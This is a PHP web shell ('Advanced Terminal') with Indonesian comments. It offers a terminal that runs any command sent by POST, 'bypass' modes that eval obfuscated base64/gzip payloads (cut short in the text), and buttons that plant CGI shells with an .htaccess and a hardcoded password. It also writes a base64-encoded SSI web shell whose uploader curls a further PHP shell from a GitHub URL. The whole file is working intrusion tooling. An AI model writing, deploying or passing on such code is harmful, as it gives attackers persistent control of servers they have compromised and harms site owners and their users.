<?php

$nm   = 'user';
$serv = gethostname();

// --------------------------------------------------
// BAGIAN TERMINAL BIASA (Normal)
$activeBox = '';
$contentNormal = '';
if (isset($_POST['normalcmd']) && isset($_POST['command'])) {
    $command = $_POST['command'];
    $activeBox = 'normalBox';

    ob_start();
    echo "Execution Result (Normal):\n\n";

    $descriptors = [
        0 => ["pipe","r"], 
        1 => ["pipe","w"], 
        2 => ["pipe","w"],
    ];
    $process = @proc_open($command, $descriptors, $pipes);

    if (is_resource($process)) {
        fwrite($pipes[0], "y\n");
        fclose($pipes[0]);
        $output = stream_get_contents($pipes[1]);
        $error  = stream_get_contents($pipes[2]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        $status = proc_close($process);

        echo $output;
        if ($error) {
            echo "\n[ERROR]\n" . $error;
        }
    } else {
        echo "Failed to open process.";
    }

    $contentNormal = ob_get_clean();
}

// --------------------------------------------------
// BAGIAN TERMINAL BYPASS PHP 7
$content7 = '';
if (!empty($_POST['cmd7'])) {
    $x = $_POST['cmd7'];
    $activeBox = 'php7Box'; 

    ob_start();
    echo "Execution Result (Bypass PHP V1):\n\n";
    echo $nm."@".$serv.": ~\$ ".$x."\n\n";

    // Bagian bypass7
    $reqex = "eJzFWG1v2kgQ/p5fsSW+YAq0hhCgOFBV7VU9qbpEbU/9EEWWsdfBrbEtvxBoy3+/md21vX4jd9JJZwls7..."
             ."... (Data Panjang base64, gz) ...";
    @eval("?>".gzuncompress(base64_decode($reqex)));

    $content7 = ob_get_clean();
}

// --------------------------------------------------
// BAGIAN TERMINAL BYPASS PHP 8
$content8 = '';
if (!empty($_POST['cmd8'])) {
    $x = $_POST['cmd8'];
    $activeBox = 'php8Box';

    ob_start();
    echo "Execution Result (Bypass PHP V2):\n\n";
    echo $nm."@".$serv.": ~\$ ".$x."\n\n";

    // Bagian bypass8
    $reqex = "eJytWFtzm0YUfvev2DLUQZXsgOVKcnRJnNpju01tN3byEEXDrGARJA..."
             ."... (Data Panjang base64, gz) ...";
    @eval("?>".gzuncompress(base64_decode($reqex)));

    $content8 = ob_get_clean();
}

// --------------------------------------------------
// BAGIAN SUMMON CGI
$cgiResult = '';
if (isset($_POST['summon'])) {
    $activeBox = 'cgiBox';

    $submit = $_POST['summon'];
    $cgipy = "eJytV21v2zgM/u5fwboonKCp03UDBnRJgL5kaw5rUzTZD..."
             ."... (Data Panjang base64, gz) ...";
    $cgipl = "eJztfXtf27gS6P98CtVkSbKEPKB0t4SkyyPQtBRoEqAPuj1O7CReH..."
             ."... (Data Panjang base64, gz) ...";

    $op = $_POST['option'] ?? '';
    switch ($op) {
        case 'cgipy':
            $cgi_dir = mkdir('t0ku_cgi', 0755);
            chdir('t0ku_cgi');
            $file_cgi = "cgipy.99";
            $memeg = ".htaccess";
            $isi_htcgi = "OPTIONS Indexes Includes ExecCGI FollowSymLinks \nAddType application/x-httpd-cgi .99 \nAddHandler cgi-script .99 \nAddHandler cgi-script .99";
            $htcgi = fopen(".htaccess", "w");
            $cgi = fopen($file_cgi, "w");
            fwrite($cgi, gzuncompress(base64_decode($cgipy)));
            fwrite($htcgi, $isi_htcgi);
            chmod($file_cgi, 0755);
            chmod($memeg, 0755);
            $cgiResult = "Successfully Summoned <b>CGI (Py)</b><br> Password : <b>Lewster1337</b><br>
                <a href='t0ku_cgi/$file_cgi' target='_blank'>[Open CGI Here]</a>";
            break;

        case 'cgi':
            $cgi_dir = mkdir('t0ku_cgi', 0755);
            chdir('t0ku_cgi');
            $file_cgi = "cgipl.99";
            $memeg = ".htaccess";
            $isi_htcgi = "OPTIONS Indexes Includes ExecCGI FollowSymLinks \nAddType application/x-httpd-cgi .99 \nAddHandler cgi-script .99 \nAddHandler cgi-script .99";
            $htcgi = fopen(".htaccess", "w");
            $cgi = fopen($file_cgi, "w");
            fwrite($cgi, gzuncompress(base64_decode($cgipl)));
            fwrite($htcgi, $isi_htcgi);
            chmod($file_cgi, 0755);
            chmod($memeg, 0755);
            $cgiResult = "Successfully Summoned <b>CGI (Light)</b><br> Password : <b>Lewster1337</b><br>
                <a href='t0ku_cgi/$file_cgi' target='_blank'>[Open CGI Here]</a>";
            break;

        default:
            $cgiResult = "No valid option selected.";
            break;
    }
}

// --------------------------------------------------
// BAGIAN SUMMON index.shtml (BARU)
$shtmlResult = '';
if (isset($_POST['summon_shtml'])) {
    $activeBox = 'shtmlBox';
    $base64Shtml = "PCEtLSNjb25maWcgZXJybXNnPSJGdW5jdGlvbiBTU0kgRGlzYWJsZWQiLS0+DQo8IS0tI3NldCB2YXI9Inplcm8iIHZhbHVlPSIiIC0tPg0KPCEtLSNpZiBleHByPSIkUVVFUllfU1RSSU5HX1VORVNDQVBFRCA9IFwkemVybyIgLS0+DQo8IS0tI3NldCB2YXI9InNobCIgdmFsdWU9Indob2FtaSIgLS0+DQo8IS0tI2Vsc2UgLS0+DQo8IS0tI3NldCB2YXI9InNobCIgdmFsdWU9JFFVRVJZX1NUUklOR19VTkVTQ0FQRUQgLS0+DQo8IS0tI2VuZGlmIC0tPg0KPCFET0NUWVBFIGh0bWw+DQo8aHRtbD4NCjxoZWFkPg0KPHRpdGxlPlNTSSBXZWJzaGVsbDwvdGl0bGU+DQo8c2NyaXB0IHNyYz0iaHR0cHM6Ly9hamF4Lmdvb2dsZWFwaXMuY29tL2FqYXgvbGlicy9qcXVlcnkvMi4xLjEvanF1ZXJ5Lm1pbi5qcyI+PC9zY3JpcHQ+DQo8c2NyaXB0IGxhbmd1YWdlPSJqYXZhc2NyaXB0Ij4NCmZ1bmN0aW9uIG5lemNtZCgpDQp7DQogIHZhciB1cmkgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnY29tbWFuZCcpLnZhbHVlOw0KCXZhciByZXAgPSB1cmkucmVwbGFjZSgvWyBdL2csJyR7SUZTfScpOw0KCXZhciByZXMgPSBlbmNvZGVVUkkodXJpKTsNCglkb2N1bWVudC5sb2NhdGlvbi5ocmVmPSI8IS0tI2VjaG8gdmFyPURPQ1VNRU5UX05BTUUgLS0+PyIrZW5jb2RlVVJJKHJlcCk7DQp9DQoNCmZ1bmN0aW9uIGFkZHVwbG9hZCgpDQp7DQoJZG9jdW1lbnQubG9jYXRpb24uaHJlZj0iPCEtLSNlY2hvIHZhcj1ET0NVTUVOVF9OQU1FIC0tPj8iKyJjdXJsJHtJRlN9LUxzJHtJRlN9cmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9BemhhcmlLdW4vd2Vic2hlbGwvbWFpbi9sZXRzcGVlZC5waHAke0lGU318JHtJRlN9dGVlJHtJRlN9LWEke0lGU31sZXQucGhwIjsNCn0NCjwvc2NyaXB0Pg0KPHN0eWxlIHR5cGU9InRleHQvY3NzIj4NCgkuaW5wdXQgew0KCQliYWNrZ3JvdW5kOiB0cmFuc3BhcmVudDsNCgkJYm9yZGVyLWNvbG9yOiAjZmZmZmZmOw0KCQlib3JkZXItd2lkdGg6IHRoaW47DQoJCWJvcmRlcjogZ3Jvb3ZlOw0KCQljdXJzb3I6IHBvaW50ZXI7DQoJfQ0KDQoJYnV0dG9uIHsNCgkJY3Vyc29yOiBwb2ludGVyOw0KCX0NCjwvc3R5bGU+DQo8L2hlYWQ+DQo8Yj48Zm9udCBmYWNlPSJjb3VyaWVyIiBzaXplPSI0Ij48aT5TU0kgV2Vic2hlbGw8L2ZvbnQ+PC9iPjxmb250IGZhY2U9ImNvdXJpZXIiPg0KCTxicj48YnI+U3lzdGVtIDogPGI+PCEtLSNleGVjIGNtZD0ie3VuYW1lLC1ucnZ9IiAtLT48L2I+DQoJPGJyPkN1cnJlbnQgUGF0aCA6IDxiPjwhLS0jZWNobyB2YXI9RE9DVU1FTlRfUk9PVCAtLT48L2I+PC9pPjxicj48YnI+DQoJTXlTcWwgOiA8Yj48IS0tI2V4ZWMgY21kPSJ7dGVzdCwtZSwvdXNyL2Jpbi9teXNxbH0mJntlY2hvLE9OfXx8e2VjaG8sT0ZGfSIgLS0+PC9iPiZuYnNwO3wmbmJzcDsgV2dldCA6IDxiPjwhLS0jZXhlYyBjbWQ9Int0ZXN0LC1lLC91c3IvYmluL3dnZXR9JiZ7ZWNobyxPTn18fHtlY2hvLE9GRn0iIC0tPjwvYj48L2I+Jm5ic3A7fCZuYnNwOyBDdXJsIDogPGI+PCEtLSNleGVjIGNtZD0ie3Rlc3QsLWUsL3Vzci9iaW4vY3VybH0mJntlY2hvLE9OfXx8e2VjaG8sT0ZGfSIgLS0+PC9iPjxicj4NCgk8Zm9udD4gQ09NTUFORCA6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBzaXplPSIzMCIgaWQ9ImNvbW1hbmQiIGNsYXNzPSJ0ZXh0IiBuYW1lPSJhZGRyZXNzMSIgc3R5bGU9Im1heC13aWR0aDogMTAwJTsgbWF4LWhlaWdodDogMTAwJTsiPiZuYnNwOzxidXR0b24gY2xhc3M9ImlucHV0IiBpZD0iZ2FzIiBvbmNsaWNrPSJuZXpjbWQoKTsiPmV4ZWN1dGU8L2J1dHRvbj4gPGJ1dHRvbiBjbGFzcz0iaW5wdXQiIGlkPSJnYXMiIG9uY2xpY2s9ImFkZHVwbG9hZCgpOyI+dXBsb2FkZXI8L2J1dHRvbj48YnI+PGJyPg0KRXhlY3V0ZWQgQ29tbWFuZCA6IDwvZm9udD48Yj48Zm9udCBmYWNlPSJjb3VyaWVyIiBpZD0iY21kIj48IS0tI2VjaG8gdmFyPXNobCAtLT48L2ZvbnQ+PC9iPjwvaT4NCjxwcmU+PCEtLSNleGVjIGNtZD0kc2hsIC0tPjwvcHJlPg0KPHNjcmlwdD4NCiAgdmFyIGNtZCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJjbWQiKS5pbm5lckhUTUwuc3BsaXQoIiR7SUZTfSIpLmpvaW4oIiAiKTsNCglkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiY21kIikuaW5uZXJIVE1MID0gY21kOw0KCXZhciBnYXNrYW4gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiY29tbWFuZCIpOw0KCWdhc2thbi5hZGRFdmVudExpc3RlbmVyKCJrZXl1cCIsIGZ1bmN0aW9uKGV2ZW50KSB7DQoJICBpZiAoZXZlbnQua2V5Q29kZSA9PT0gMTMpIHsNCgkgICAgZXZlbnQucHJldmVudERlZmF1bHQoKTsNCgkgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImdhcyIpLmNsaWNrKCk7DQoJfQ0KfSk7DQo8L3NjcmlwdD4NCjwvaHRtbD4="; 

    $decodedData = base64_decode($base64Shtml);
    file_put_contents('index.shtml', $decodedData);
    chmod('index.shtml', 0644);
    $shtmlResult  = "Successfully Summoned <b>index.shtml</b>!<br>";
    $shtmlResult .= "Cek di direktori yang sama.<br>";
    $shtmlResult .= "<a href='index.shtml' target='_blank'>[Open index.shtml Here]</a>";
}

?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Advanced Terminal + Summon CGI + Summon SHTML</title>
    <style>
    /* ---- Tema Ungu + Neon Biru (mirip Gyokka) ---- */
    body {
      margin:0; 
      padding:0;
      background:#0a001a; /* Ungu tua */
      color:#fff; 
      font-family:sans-serif;
    }
    header {
      background:#0f0027; 
      padding:10px 20px; 
      border-bottom:3px solid #00fceb; /* neon line */
      display:flex; 
      align-items:center;
    }
    header h1 {
      margin:0; 
      font-size:1.3em; 
      color:#00fceb; 
      text-shadow: 0 0 5px #00fceb;
    }
    .container { 
      padding:20px; 
    }
    .menu-bar button {
      background:#00fceb; 
      color:#0f0027; 
      border:none; 
      padding:8px 16px; 
      cursor:pointer; 
      border-radius:4px; 
      font-weight:bold;
      margin-right:10px;
      margin-bottom:10px;
      transition: background 0.2s, box-shadow 0.2s;
    }
    .menu-bar button:hover {
      background:#33ffee;
      box-shadow:0 0 8px #00fceb;
    }
    .term-box {
      display:none;
      background:#1c0033; /* Panel ungu gelap */
      border:2px solid #00fceb;
      border-radius:6px;
      padding:20px;
      margin-bottom:20px;
    }
    .term-box h2 {
      color:#00fceb;
      margin-top:0;
      text-shadow: 0 0 5px #00fceb;
    }
    label {
      font-weight:bold; 
      display:block; 
      margin-bottom:5px;
    }
    input[type=text] {
      width:100%;
      background:#2a004d; 
      border:1px solid #3b006b; 
      color:#fff; 
      border-radius:4px; 
      padding:8px;
      margin-bottom:8px;
    }
    select {
      background:#2a004d; 
      border:1px solid #3b006b; 
      color:#fff;
      border-radius:4px;
      padding:4px 8px;
      margin-bottom:8px;
      font-weight:bold;
    }
    .btn-submit {
      background:#00fceb; 
      color:#0f0027; 
      border:none; 
      padding:8px 16px; 
      cursor:pointer; 
      border-radius:4px; 
      font-weight:bold;
      margin-right:10px;
      margin-top:5px;
      transition: background 0.2s, box-shadow 0.2s;
    }
    .btn-submit:hover {
      background:#33ffee;
      box-shadow:0 0 8px #00fceb;
    }
    textarea.output-area {
      width:100%;
      height:200px;
      background:#0a001a;
      border:1px solid #3b006b;
      border-radius:6px;
      color:#fff;
      padding:10px;
      font-family:monospace;
      margin-top:5px;
      white-space:pre;
      overflow:auto;
      resize:vertical;
    }
    </style>
</head>
<body>
<header>
  <h1>Advanced Terminal</h1>
</header>

<div class="container">
  <div class="menu-bar">
    <button type="button" onclick="showTerminal('normalBox')">Terminal Biasa</button>
    <button type="button" onclick="showTerminal('php7Box')">Terminal Bypass PHP V1</button>
    <button type="button" onclick="showTerminal('php8Box')">Terminal Bypass PHP V2</button>
    <button type="button" onclick="showTerminal('cgiBox')">Summon CGI</button>
    <button type="button" onclick="showTerminal('shtmlBox')">Summon index.shtml</button>
  </div>

  <!-- Terminal Biasa -->
  <div id="normalBox" class="term-box">
    <h2>Terminal Biasa</h2>
    <form method="post">
      <label>Enter command (Normal):</label>
      <input type="text" name="command" placeholder="ls -la">
      <input type="submit" name="normalcmd" class="btn-submit" value="Run Normal">
    </form>

    <?php if ($contentNormal): ?>
      <h3>Execution Result (Normal):</h3>
      <textarea class="output-area" readonly><?php echo htmlspecialchars($contentNormal); ?></textarea>
    <?php endif; ?>
  </div>

  <!-- Terminal Bypass PHP V1 -->
  <div id="php7Box" class="term-box">
    <h2>Terminal Bypass PHP V1</h2>
    <form method="post">
      <label>Enter command (Bypass V1):</label>
      <input type="text" name="cmd7" placeholder="ls -la">
      <input type="submit" class="btn-submit" value="Run Bypass V1">
    </form>

    <?php if ($content7): ?>
      <h3>Execution Result (Bypass PHP V1):</h3>
      <textarea class="output-area" readonly><?php echo htmlspecialchars($content7); ?></textarea>
    <?php endif; ?>
  </div>

  <!-- Terminal Bypass PHP V2 -->
  <div id="php8Box" class="term-box">
    <h2>Terminal Bypass PHP V2</h2>
    <form method="post">
      <label>Enter command (Bypass V2):</label>
      <input type="text" name="cmd8" placeholder="ls -la">
      <input type="submit" class="btn-submit" value="Run Bypass V2">
    </form>

    <?php if ($content8): ?>
      <h3>Execution Result (Bypass PHP V2):</h3>
      <textarea class="output-area" readonly><?php echo htmlspecialchars($content8); ?></textarea>
    <?php endif; ?>
  </div>

  <!-- Summon CGI -->
  <div id="cgiBox" class="term-box">
    <h2>Summon CGI</h2>
    <form method="post">
      <label>Choose CGI Type:</label>
      <select name="option">
         <option value="cgi">Light CGI</option>
         <option value="cgipy">Python-like CGI</option>
      </select>
      <br>
      <input type="submit" class="btn-submit" name="summon" value="Summon CGI">
    </form>

    <?php if ($cgiResult): ?>
      <div style="margin-top:10px; font-size:0.9em;">
        <?php echo $cgiResult; ?>
      </div>
    <?php endif; ?>
  </div>

  <!-- Summon index.shtml (BARU) -->
  <div id="shtmlBox" class="term-box">
    <h2>Summon index.shtml</h2>
    <form method="post">
      <label>Base64 -> index.shtml (No folder, no .htaccess)</label>
      <input type="submit" name="summon_shtml" class="btn-submit" value="Summon index.shtml">
    </form>
    <?php if ($shtmlResult): ?>
      <div style="margin-top:10px; font-size:0.9em;">
        <?php echo $shtmlResult; ?>
      </div>
    <?php endif; ?>
  </div>

</div>

<script>
function showTerminal(id) {
  // Hide all
  document.getElementById('normalBox').style.display = 'none';
  document.getElementById('php7Box').style.display  = 'none';
  document.getElementById('php8Box').style.display  = 'none';
  document.getElementById('cgiBox').style.display   = 'none';
  document.getElementById('shtmlBox').style.display = 'none'; // Baru

  // Show chosen
  document.getElementById(id).style.display = 'block';
}

document.addEventListener('DOMContentLoaded', function(){
   var active = '<?php echo $activeBox; ?>';
   if (active) {
      showTerminal(active);
   }
});
</script>

</body>
</html>
